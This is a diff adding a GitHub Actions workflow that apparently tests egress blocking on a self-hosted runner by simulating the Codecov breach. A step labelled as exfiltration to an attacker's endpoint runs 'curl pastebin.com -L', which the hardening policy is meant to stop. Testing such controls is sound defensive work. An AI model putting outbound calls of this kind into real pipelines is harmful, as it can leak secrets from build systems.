@@ -1,0 +1,21 @@
+name: ARC Codecov Simulation
+on:
+  workflow_dispatch:
+
+jobs:
+  arc-codecov-simulation:
+    runs-on: self-hosted
+    steps:
+      - name: Harden Runner
+        uses: step-security/harden-runner@v2
+        with:
+          egress-policy: block
+          allowed-endpoints: >
+            api.github.com:443
+            github.com:443
+
+      - uses: actions/checkout@v3
+
+      # Codecov Scenario: Exfiltrate data to attacker's endpoint
+      - name: Data Exfiltration To Attacker Controller Endpoint
+        run: curl pastebin.com -L
